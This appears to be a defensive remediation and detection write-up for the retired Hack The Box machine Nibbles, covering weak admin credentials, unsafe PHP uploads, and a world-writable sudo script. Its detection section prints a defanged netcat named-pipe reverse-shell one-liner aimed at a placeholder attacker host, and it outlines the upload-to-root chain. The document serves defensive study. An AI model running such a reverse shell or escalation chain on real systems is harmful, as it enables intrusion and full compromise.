# Nibbles — Remediation & Defensive Analysis

> A defensive analysis for the **retired** Hack The Box machine *Nibbles*. Retired machines
> are approved for public publication under HTB's content-sharing rules. Detection examples use
> defanged identifiers for filter compatibility. See
> [`SANITIZATION.md`](../../SANITIZATION.md).

> This document synthesizes the defensive observations recorded throughout the Nibbles assessment
> into actionable recommendations. Findings are organized by their impact on the attack chain rather
> than by discovery order — the most critical findings appear first.

> **Primary defensive lesson:** individually moderate weaknesses — including default credentials,
> insufficient upload validation, executable upload directories, and an unsafe `sudo` policy —
> combined into a complete compromise. Eliminating any one of the critical links in the chain would
> have prevented root-level access.

---

## Tier 1 — Attack Chain Breakers (Critical)

These findings directly enabled the compromise. Remediating any one of them would have broken the
kill chain at that stage.

### 1.1 Default / Guessable Credentials

**Finding:** the Nibbleblog admin password (`nibbles`) was derived from the application's own
configuration — the site name, SEO title, and notification email domain. No brute-force was
required; the password was inferred through enumeration of exposed configuration files.

**Remediation:**
- Set a strong, randomly generated admin password at installation — never use the application name,
  site name, or any value that appears elsewhere in the configuration.
- Enforce a minimum password complexity policy for admin accounts.
- Rotate credentials periodically and after any suspected exposure.

**Kill-chain position:** without valid credentials, the authenticated file-upload vulnerability
(CVE-2015-6967) cannot be exercised. Credential hygiene alone breaks the initial-access path.

---

### 1.2 Insufficient File-Upload Validation

**Finding:** the Nibbleblog "My image" plugin accepted an arbitrary PHP file as an upload,
performing no meaningful content-type validation before writing the file to disk. The only
validation attempted was post-upload image processing (GD library), which failed gracefully and
left the uploaded file in place.

**Remediation:**
- Validate uploaded file content against an allowlist of acceptable MIME types *before* writing to
  disk — reject anything that is not a valid image.
- Validate by content (magic bytes / file signature), not by file extension alone.
- Rename uploaded files to a server-assigned name with a safe extension (e.g., `.jpg`) regardless
  of the uploaded extension — never preserve an uploaded `.php` extension.
- Disable PHP execution in upload directories (Apache: `php_flag engine off` in the upload
  directory's `.htaccess`, or equivalent server configuration).

**Kill-chain position:** if the plugin had rejected non-image uploads, no webshell could have been
planted. If execution had been disabled in the upload directory, the PHP file would have been served
as source rather than executed — still a disclosure risk, but not code execution.

---

### 1.3 Executable Content in a Web-Served Upload Directory

**Finding:** uploaded files were stored under
`/var/www/html/nibbleblog/content/private/plugins/my_image/`, which is both web-served (accessible
via HTTP) and PHP-executable. A PHP file placed there by the upload handler was immediately
executable by requesting it via the browser.

**Remediation:**
- Store all user-uploaded content outside the web root entirely, serving it through a controller
  that reads the file and sets an appropriate, safe `Content-Type` header.
- If uploads must be web-served, disable server-side script execution in those directories at the
  web server level — not the application level — so that even a misconfigured application cannot
  create an executable webshell.

**Kill-chain position:** separating upload storage from the web root means a successful upload
never becomes directly requestable. Disabling PHP execution in the upload path means a stored PHP
file cannot be executed even if found.

---

### 1.4 World-Writable Script with Passwordless Sudo

**Finding:** `monitor.sh` was world-writable (`rwxrwxrwx`) and simultaneously authorized for
passwordless root execution via `sudo`. Appending a payload to the script and executing it via
`sudo` produced a root shell with no further authentication.

**Remediation:**
- Scripts authorized through `sudo` must be owned by `root` and writable only by `root`
  (`chmod 755`, `chown root:root`). A user-owned, world-writable file in a `sudo` policy is
  equivalent to granting that user unconditional root access.
- Audit `sudoers` policy regularly. Every `NOPASSWD` entry represents a trust decision that
  should be explicitly reviewed and justified.
- Apply the principle of least privilege: if a monitoring task requires elevated access, consider
  running it as a dedicated service with a minimal, scoped privilege set rather than granting
  unrestricted script execution as root.
- Review and remove unnecessary `sudo` entries — in this case, there was no operational
  justification for a user-writable monitoring script to run as root.

**Kill-chain position:** if `monitor.sh` were owned by root and not writable, the sudo entry would
pose no risk — the script's behavior would be fixed. If the sudo entry required a password, the
privesc would require a credential the attacker did not have.

---

## Tier 2 — Risk Reduction (High)

These findings did not directly cause the compromise but materially reduced the attacker's effort
and increased exposure. Remediating them would have made each phase significantly harder.

### 2.1 Directory Listing Enabled

**Finding:** Apache directory listing was enabled across the application, exposing the full contents
of `content/`, `content/private/`, `content/private/plugins/`, and other paths without
authentication. This disclosed `users.xml`, `config.xml`, `keys.php`, `shadow.php`, plugin
structure, and the uploaded webshell path.

**Remediation:**
- Disable directory indexing globally in the Apache configuration (`Options -Indexes`) and confirm
  it is not re-enabled in any `.htaccess` file.
- Apply a deny-by-default posture: serve only explicitly mapped resources.

---

### 2.2 Sensitive Configuration Files Web-Accessible

**Finding:** `content/private/users.xml` and `content/private/config.xml` were readable via HTTP
without authentication. `users.xml` disclosed the admin username; `config.xml` disclosed the
application identity clues used to derive the password.

**Remediation:**
- Application configuration and data stores should never be web-served directly. Move private
  application data outside the web root, or restrict access at the web server level
  (`Require all denied` for the `content/private/` path).
- Deny direct HTTP access to XML data files regardless of directory listing configuration.

---

### 2.3 Verbose PHP Error Messages

**Finding:** the file-upload attempt produced six PHP image-processing warnings in the HTTP
response, disclosing the full server-side file path
(`/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php`) and confirming that the upload
had been processed. This both confirmed the upload's success and revealed the document root and
application layout.

**Remediation:**
- Disable PHP error display in production (`display_errors = Off` in `php.ini`).
- Log errors server-side rather than returning them to the client.
- Suppress or genericize error messages at the application layer for all user-facing responses.

---

### 2.4 `PermitRootLogin yes` in SSH Configuration

**Finding:** the SSH daemon was configured to accept direct root logins. With root credentials
obtained via privilege escalation, an attacker could establish a persistent, authenticated SSH
session as root without requiring further exploitation.

**Remediation:**
- Set `PermitRootLogin no` in `/etc/ssh/sshd_config` and restart the SSH service.
- Require administrators to SSH as a non-privileged user and elevate via `sudo` for specific tasks.

---

### 2.5 Publicly Accessible Version-Identifying Documentation

**Finding:** the Nibbleblog `README` file was publicly readable and disclosed the exact application
version (`v4.0.3`), which directly matched the affected version in CVE-2015-6967. This removed all
uncertainty about applicability of the known vulnerability.

**Remediation:**
- Remove installation documentation, `README` files, and `CHANGELOG` files from production
  deployments.
- Restrict or block HTTP access to any path that could disclose application version information.

---

### 2.6 Outdated Software (End-of-Life CMS)

**Finding:** Nibbleblog v4.0.3 was released in 2014 and has known, publicly documented
vulnerabilities. The application appears to be abandoned (no updates since the early releases).

**Remediation:**
- Replace end-of-life software with actively maintained alternatives.
- Implement a software inventory and vulnerability management process to identify and remediate
  outdated components before they are exploited.

---

## Tier 3 — Detection Opportunities

This tier documents where defenders can intercept the attack chain through monitoring, alerting,
and behavioral detection — organized to match the kill chain phases.

### 3.1 Web Scanning and Directory Enumeration

**What to detect:** automated directory brute-forcing (gobuster, dirbuster, feroxbuster) generates
high-volume HTTP 404 responses against predictable paths in a short time window.

**Detection approach:**
- Alert on anomalous HTTP 404 spike rates from a single source IP against the web application.
- Alert on requests for common scanner paths (`/admin`, `/admin.php`, `/README`, `/config.xml`).
- Correlate source IP, user agent, and request rate to distinguish scanner traffic from legitimate
  browsing.

---

### 3.2 Credential-Derived Access to Admin Portal

**What to detect:** successful authentication to an admin portal from an unexpected source,
especially following failed attempts or enumeration activity.

**Detection approach:**
- Alert on successful admin logins from IPs not on an approved allowlist.
- Monitor `users.xml` (or equivalent) access logs for requests to internal application data files.
- Correlate admin login events with preceding directory-enumeration activity from the same source.

---

### 3.3 File Upload to Plugin Directory + Immediate Execution

**What to detect:** the upload-then-execute sequence is a high-confidence IOC. A PHP file written
to an upload directory followed immediately by an HTTP request to that exact path is the attacker's
pattern — legitimate image uploads are not subsequently requested as scripts.

**Detection approach:**
- Alert on new `.php` files created under web-served upload directories.
- Alert on HTTP requests to paths under `content/private/plugins/*/` with `Content-Type:
  text/html` responses (indicating script execution rather than static file serving).
- Correlate: file creation event → HTTP GET to the same path within a short time window = high
  confidence webshell execution.

---

### 3.4 Reverse-Shell Callback

**What to detect:** the named-pipe reverse shell produces a recognizable process tree and network
event.

**Process-level indicators:**
```
sh -c rm /tmp/f[;] mkfifo /tmp/f[;] cat /tmp/f [|] /bin/sh -i 2>&1 [|] nc <ATTACKER_IP> <PORT> [>]/tmp/f
```
- A `mkfifo` call creating `/tmp/f` or any `/tmp/`-resident named pipe.
- A `/bin/sh -i` process spawned under the web server (`nibbler` / `www-data`).
- An `nc` (netcat) process with an outbound connection initiated by the web server user.
- A `python3 -c 'import pty'` call immediately following a shell spawn (TTY upgrade pattern).

**Network-level indicators:**
- Outbound TCP connection from the web server process to a non-standard port on an external IP.
- Outbound connection established immediately after an HTTP request to an upload directory path.

---

### 3.5 Post-Exploitation Tool Transfer

**What to detect:** the transfer of enumeration tooling (LinEnum, LinPEAS, etc.) via an ad-hoc
HTTP server is a standard post-exploitation pattern.

**Detection approach:**
- Alert on outbound HTTP requests from the compromised host to non-standard ports (e.g., 8080) on
  external IPs.
- Alert on new executable files appearing in `/tmp/` (especially shell scripts: `.sh`).
- Monitor `/tmp/` for `chmod +x` operations on recently created files.
- Correlate: outbound HTTP GET → executable file in `/tmp/` → execution of that file = high
  confidence post-exploitation enumeration.

---

### 3.6 Sudo Misconfiguration Exploitation

**What to detect:** modifications to a file covered by a `sudo NOPASSWD` policy, followed by
execution of that file via `sudo`.

**Detection approach:**
- Monitor file-integrity for all files referenced in `sudoers` entries. Any write to
  `/home/nibbler/personal/stuff/monitor.sh` by a non-root user should alert immediately.
- Alert on `sudo` execution of scripts that have been recently modified.
- Alert on `sudo` commands producing outbound network connections (the root reverse shell).
- Monitor `sudoers` and `/etc/sudoers.d/` for modifications.

---

### 3.7 Root Shell Indicators

**What to detect:** a root shell established via the above path produces recognizable artifacts.

**Detection approach:**
- Alert on `uid=0` processes with a parent chain tracing back to the web server (`apache2` →
  `nibbler` → `sh` → ... → `root`).
- Alert on `/root/` directory access by processes not initiated through a legitimate root session.
- Monitor for `cat /root/root.txt` or equivalent flag-retrieval commands in process audit logs.
